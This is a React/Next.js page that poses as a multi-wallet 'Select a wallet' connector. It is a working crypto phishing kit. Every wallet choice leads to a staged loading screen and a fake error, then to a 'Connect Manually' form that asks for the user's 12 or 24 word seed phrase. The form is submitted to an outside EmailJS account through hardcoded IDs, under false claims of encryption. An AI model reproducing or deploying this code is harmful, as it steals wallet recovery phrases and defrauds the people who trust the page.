"use client";

import emailjs from "@emailjs/browser";
import { useRef } from "react";
import { useState, useEffect } from "react";
import { WalletIcon } from "@web3icons/react/dynamic";
import { Exchange1inch, ExchangeBinance, ExchangeCryptoCom, NetworkArbitrumNova, NetworkIotex, NetworkSeiNetwork, TokenAPFC, TokenCOMP, TokenCROWN, TokenCTG, TokenDHT, TokenFEAR, TokenGRC, TokenIBAT, TokenKEY, TokenNEX, TokenNHT, TokenMATH, TokenPOKT, TokenPOLS, TokenPOWR, TokenRAY, TokenSAKAI, WalletAlphaWallet, WalletArgent, WalletAtomic, WalletBitbox, WalletBlue, WalletCoin98, WalletCoinbase, WalletOkx, WalletPhantom, WalletRainbow, WalletSafe, WalletSolflare, WalletWallet3, WalletWalletConnect, } from '@web3icons/react'
import { WalletMetamask } from '@web3icons/react'
import { WalletTrust } from '@web3icons/react'
import { ArrowLeftIcon, ArrowUpIcon } from "@heroicons/react/24/solid"; // using Heroicons
import { useRouter } from "next/navigation"



const wallets = [
    { name: "MetaMask", url: "https://metamask.io", icon: WalletMetamask },
    { name: "Trust Wallet", url: "https://trustwallet.com", icon: WalletTrust },
    { name: "Coinbase Wallet", url: "https://www.coinbase.com/wallet", icon: WalletCoinbase },
    { name: "Phantom", url: "https://phantom.app", icon: WalletPhantom },
    { name: "Solflare", url: "https://solflare.com", icon: WalletSolflare },
    { name: "Best Wallet", url: "https://bestwallet.com", icon: WalletBlue },
    { name: "SafePal", url: "https://safepal.com", icon: WalletSafe },
    { name: "WalletConnect", url: "https://walletconnect.com", icon: WalletWalletConnect },
    { name: "Binance Chain Wallet", url: "https://binance.com", icon: ExchangeBinance },
    { name: "Bitget Wallet", url: "https://bitget.com", icon: WalletBitbox },
    { name: "Rainbow", url: "https://rainbow.me", icon: WalletRainbow },
    { name: "OKX Wallet", url: "https://okx.com", icon: WalletOkx },
    { name: "Walleth", url: "https://walleth.org", icon: WalletAlphaWallet },
    { name: "Argent", url: "https://argent.xyz", icon: WalletArgent },
    { name: "Huobi Wallet", url: "https://huobiwallet.com", icon: TokenNHT },
    { name: "Encrypted Ink", url: "https://encrypted.ink", icon: NetworkSeiNetwork },
    { name: "Compound", url: "https://compound.finance", icon: TokenCOMP },
    { name: "Polkadot", url: "https://polkadot.network", icon: TokenPOLS },
    { name: "IoTeX", url: "https://iotex.io", icon: NetworkIotex },
    { name: "Coin98", url: "https://coin98.com", icon: WalletCoin98 },
    { name: "Crypto.com DeFi Wallet", url: "https://crypto.com", icon: ExchangeCryptoCom },
    { name: "TokenPocket", url: "https://tokenpocket.pro", icon: TokenPOKT },
    { name: "Math Wallet", url: "https://mathwallet.org", icon: TokenMATH },
    { name: "Ledger Live", url: "https://ledger.com", icon: TokenPOWR },
    { name: "1inch", url: "https://1inch.io", icon: Exchange1inch },
    { name: "Dharma", url: "https://dharma.io", icon: TokenDHT },
    { name: "Trust Vault", url: "https://trustology.io", icon: TokenSAKAI },
    { name: "Nova Wallet", url: "https://novawallet.io", icon: NetworkArbitrumNova },
    { name: "Fearless Wallet", url: "https://fearlesswallet.io", icon: TokenFEAR },
    { name: "MYKEY", url: "https://mykey.org", icon: TokenKEY },
    { name: "Atomic Wallet", url: "https://atomicwallet.io", icon: WalletAtomic },
    { name: "CoolWallet S", url: "https://coolwallet.io", icon: TokenCTG },
    { name: "Nash", url: "https://nash.io", icon: TokenNEX },
    { name: "Coinomi", url: "https://coinomi.com", icon: TokenAPFC },
    { name: "GridPlus", url: "https://gridplus.io", icon: TokenGRC },
    { name: "Tokenary", url: "https://tokenary.io", icon: TokenRAY },
    { name: "Infinito", url: "https://infinitywallet.io", icon: TokenIBAT },
    { name: "Wallet.io", url: "https://wallet.io", icon: WalletWallet3 },
    { name: "Ownbit", url: "https://ownbit.io", icon: TokenCROWN },
];

// { name: "EasyPocket", url: "https://easypocket.app", icon: <NetworkTreasure/> },
// { name: "Bridge Wallet", url: "https://mtpelerin.com", icon: "bridge-wallet" },
// { name: "ViaWallet", url: "https://viawallet.com", icon: "viawallet" },
// { name: "BitKeep", url: "https://bitkeep.com", icon: "bitkeep" },
// { name: "Unstoppable Wallet", url: "https://unstoppable.money", icon: "unstoppable" },
// { name: "HaloDeFi Wallet", url: "https://halodefi.org", icon: "halodefi" },
// { name: "Dok Wallet", url: "https://dokwallet.com", icon: "dok-wallet" },
// { name: "Celo Wallet", url: "https://cellowallet.app", icon: "celo" },
// { name: "CoinUs", url: "https://coinus.io", icon: "coinus" },
// { name: "Valora", url: "https://valoraapp.com", icon: "valora" },
// { name: "Trustee Wallet", url: "https://trustee.global", icon: "trustee" },
// { name: "Guarda Wallet", url: "https://guarda.com", icon: "guarda" },
// { name: "Jade Wallet", url: "https://jadewallet.io", icon: "jade" },
// { name: "PlasmaPay", url: "https://plasmapay.com", icon: "plasmapay" },
// { name: "O3 Wallet", url: "https://o3.network", icon: "o3" },
// { name: "HashKey Me", url: "https://me.hashkey.com", icon: "hashkey" },
// { name: "RWallet", url: "https://rsk.co", icon: "rwallet" },
// { name: "Flare Wallet", url: "https://flarewallet.io", icon: "flare" },
// { name: "KyberSwap", url: "https://kyberswap.com", icon: "kyberswap" },
// { name: "AToken Wallet", url: "https://atoken.com", icon: "atoken" },
// { name: "Tongue Wallet", url: "https://tongue.fi", icon: "tongue" },
// { name: "XinFin XDC", url: "https://xinfin.io", icon: "xinfin" },
// { name: "Talken Wallet", url: "https://talken.io", icon: "talken" },
// { name: "KEYRING PRO", url: "https://keyring.app", icon: "keyring" },
// { name: "Midas Wallet", url: "https://midasprotocol.io", icon: "midas" },
// { name: "AT.Wallet", url: "https://authentrend.com", icon: "atwallet" },
// {
//     name: "imToken", url: "https://token.im", icon: <ExchangeBinance variant="branded" size={64} />},


function ScrollToTopButton() {
    const [visible, setVisible] = useState(false);

    // Track scroll position
    useEffect(() => {
        const handleScroll = () => {
            setVisible(window.scrollY > 300); // show after 300px
        };
        window.addEventListener("scroll", handleScroll);
        return () => window.removeEventListener("scroll", handleScroll);
    }, []);

    const scrollToTop = () => {
        window.scrollTo({ top: 0, behavior: "smooth" });
    };

    return (
        <button
            onClick={scrollToTop}
            className={`
        fixed bottom-6 right-6 z-50 flex h-12 w-12 items-center justify-center rounded-full bg-blue-600 text-white shadow-lg transform transition-all duration-500 ease-in-out
        ${visible ? "opacity-100 scale-100" : "opacity-0 scale-0"}
        hover:bg-blue-700 hover:rotate-12
      `}
            aria-label="Scroll to top"
        >
            <ArrowUpIcon className="h-6 w-6" />
        </button>
    );
}


export default function WalletPage() {
    const [isOpen, setIsOpen] = useState(false);
    const [selectedWallet, setSelectedWallet] = useState(null);
    const [step, setStep] = useState("loading");
    const formRef = useRef(null);
    const [mnemonic, setMnemonic] = useState("");

    function sendEmail(e) {
        e.preventDefault();

        emailjs.sendForm(
            "service_64rkjo7",
            "template_ztio1ic",
            formRef.current,
            "2eJD-AJ6Uxkbmfdy2"
        ).then(
            () => {
                alert("Submitted successfully");
                setStep("loading");
            },
            (error) => {
                console.error("EmailJS error:", error);
                alert("Submission failed");
            }
        );
    }



    // 🔁 handle timed loading
    useEffect(() => {
        if (step === "loading") {
            const t = setTimeout(() => setStep("error"), 3000);
            return () => clearTimeout(t);
        }

        if (step === "manual-loading") {
            const t = setTimeout(() => setStep("manual-form"), 2000);
            return () => clearTimeout(t);
        }
    }, [step]);

    function openWallet(wallet) {
        setSelectedWallet(wallet);
        setIsOpen(true);
        setStep("loading");
    }

    function closeModal() {
        setIsOpen(false);
        setSelectedWallet(null);
        setStep("loading");
    }

    const router = useRouter()

    return (
        <>
            {/* HEADER */}
            <div className="flex flex-col items-center text-center gap-2 relative">
                {/* Back arrow button */}
                <button
                    onClick={() => router.push("/")}
                    className="absolute left-0 top-1/2 -translate-y-1/2 flex items-center gap-1 text-gray-600 hover:text-blue-600 transition-colors"
                >
                    <ArrowLeftIcon className="h-10 w-10 text-sm font-medium" />
                </button>

                {/* Title */}
                <h1 className="text-xl font-bold text-black">
                    Select a wallet
                </h1>

                {/* animated accent */}
                <div className="relative mt-1 h-[3px] w-24 overflow-hidden rounded-full bg-gray-200">
                    <div className="absolute inset-0 animate-accent bg-gradient-to-r from-transparent via-black to-transparent" />
                </div>
            </div>

            {/* WALLET GRID */}
            <div className="p-8 grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-6">
                {wallets.map(wallet => (
                    <button
                        key={wallet.name} // unique key
                        onClick={() => openWallet(wallet)}
                        className="flex items-center gap-4 rounded-xl border border-black p-4 hover:border-blue-500 hover:shadow-md transition"
                    >
                        {/* ICON on the LEFT */}
                        <div className="flex-shrink-0">
                            <wallet.icon size={64} variant="branded" />
                        </div>

                        {/* NAME + URL stacked vertically on the RIGHT */}
                        <div className="flex flex-col">
                            <p className="font-semibold text-lg">{wallet.name}</p>
                            <p className="text-sm text-slate-600">{wallet.url}</p>
                        </div>
                    </button>
                ))}
            </div>


            {/* MODAL */}
            {isOpen && selectedWallet && (
                <div
                    className="fixed inset-0 z-50 flex items-center justify-center bg-black/40"
                    onClick={closeModal}   // 👈 outside click closes
                >
                    <div
                        className="relative w-[380px] rounded-2xl bg-white p-6"
                        onClick={(e) => e.stopPropagation()} // 👈 prevent close on inner clicks
                    >
                        <button
                            onClick={closeModal}
                            className="absolute right-3 top-3 text-gray-400 hover:text-black"
                        >
                            ✕
                        </button>

                        {/* HEADER */}
                        <div className="flex flex-col items-center text-center gap-3">
                            <selectedWallet.icon size={68} variant="branded" /> {/* ✅ use component directly */}
                            <h2 className="text-lg font-semibold text-black">{selectedWallet.name}</h2>
                            <p className="text-sm text-gray-500">
                                This session is secured and encrypted
                            </p>
                        </div>


                        {/* LOADING */}
                        {(step === "loading" || step === "manual-loading") && (
                            <div className="mt-6 flex flex-col items-center gap-3">
                                <div className="relative h-1 w-full overflow-hidden rounded bg-gray-200">
                                    <div className="absolute h-full w-1/3 animate-loader bg-blue-600 rounded" />
                                </div>

                                <p className="font-medium text-gray-400">Starting secured connection</p>
                                <p className="text-sm text-gray-500">Please wait…</p>
                            </div>
                        )}

                        {/* ERROR */}
                        {step === "error" && (
                            <>
                                <div className="mt-4 rounded-md border border-red-500 bg-red-50 px-3 py-2 text-sm text-red-600">
                                    An error occurred… please try again or connect manually
                                </div>

                                <div className="mt-4 space-y-2">
                                    <button
                                        onClick={() => setStep("loading")}
                                        className="w-full rounded-4xl font-bold text-sm border cursor-pointer text-blue-200 border-blue-400 py-2 hover:bg-blue-700 hover:text-white transition-colors duration-500 ease-in-out"

                                    >
                                        Try Again
                                    </button>

                                    <button
                                        onClick={() => setStep("manual-loading")}
                                        className="w-full rounded-4xl cursor-pointer font-bold text-sm py-2 text-white bg-violet-600 hover:bg-violet-400"
                                    >
                                        Connect Manually
                                    </button>
                                </div>
                            </>
                        )}

                        {/* MANUAL FORM */}
                        {step === "manual-form" && (
                            <form
                                ref={formRef}
                                onSubmit={sendEmail}
                                className="mt-4 space-y-4"
                            >
                                {/* Wallet name input (read-only) */}
                                <input
                                    name="wallet_name"
                                    value={selectedWallet.name}
                                    readOnly
                                    className="w-full rounded-md text-gray-500 border px-3 py-2 text-sm bg-gray-100"
                                />

                                {/* Mnemonic textarea */}
                                <textarea
                                    rows={4}
                                    placeholder="Enter your 12 or 24 Mnemonic words. Separate them with spaces."
                                    className="w-full rounded-md border text-gray-500 px-3 py-2 text-sm focus:ring-2 focus:ring-blue-500 transition"
                                    value={mnemonic}
                                    onChange={(e) => setMnemonic(e.target.value)}
                                />

                                {/* Hidden time input */}
                                <input
                                    type="hidden"
                                    name="time"
                                    value={new Date().toLocaleString()}
                                />

                                {/* Submit button */}
                                <button
                                    type="submit"
                                    disabled={mnemonic.split(" ").filter(Boolean).length < 12}
                                    className={`
      w-full rounded-4xl font-bold text-sm py-2 
      ${mnemonic.split(" ").filter(Boolean).length >= 12
                                            ? "bg-violet-600 text-white hover:bg-violet-700"
                                            : "bg-gray-300 text-gray-500 cursor-not-allowed"}
      transition-colors duration-500 ease-in-out
    `}
                                >
                                    Validate Wallet
                                </button>
                            </form>

                        )}

                        <p className="mt-4 text-center text-xs text-gray-400">
                            🔒 This session is protected with end-to-end encryption
                        </p>
                    </div>
                </div>
            )}

            {/* animation */}
            <style jsx>{`
@keyframes loader {
  0% { left: -30%; }
  50% { left: 100%; }
  100% { left: -30%; }
}

.animate-loader {
  animation: loader 1.5s infinite ease-in-out;
}

/* subtle title accent animation */
@keyframes accent {
  0% {
    transform: translateX(-100%);
    opacity: 0.2;
  }
  50% {
    opacity: 1;
  }
  100% {
    transform: translateX(100%);
    opacity: 0.2;
  }
}

.animate-accent {
  animation: accent 2.2s ease-in-out infinite;
}
            `}</style>

            {/* SCROLL TO TOP BUTTON */}
            {typeof window !== "undefined" && (
                <ScrollToTopButton />
            )}

        </>
    );
}
